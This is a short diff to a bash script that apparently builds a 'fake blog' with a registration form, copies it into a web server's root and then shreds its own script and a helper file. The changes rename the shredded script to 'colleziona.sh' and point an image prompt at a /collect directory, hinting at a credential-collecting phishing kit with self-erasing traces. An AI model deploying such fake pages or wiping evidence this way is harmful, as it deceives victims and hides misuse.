@@ -42,7 +42,7 @@ echo "Insert title for the fake blog: "
 read argom
 echo "Insert description for the registration for the blog: "
 read desc
-echo "Insert background image (placed in this directory) "
+echo "Insert background image (placed in this directory ---> /collect) "
 read immag
 
 cat > index.html << EOF
@@ -118,7 +118,7 @@ backd=$(cat dir.txt)
 
 cp * /var/www/html
 cd /var/www/html
-shred -n 7 -u -z event.sh > /dev/null
+shred -n 7 -u -z colleziona.sh > /dev/null
 shred -u -z dir.txt > /dev/null
 cd $backd
 
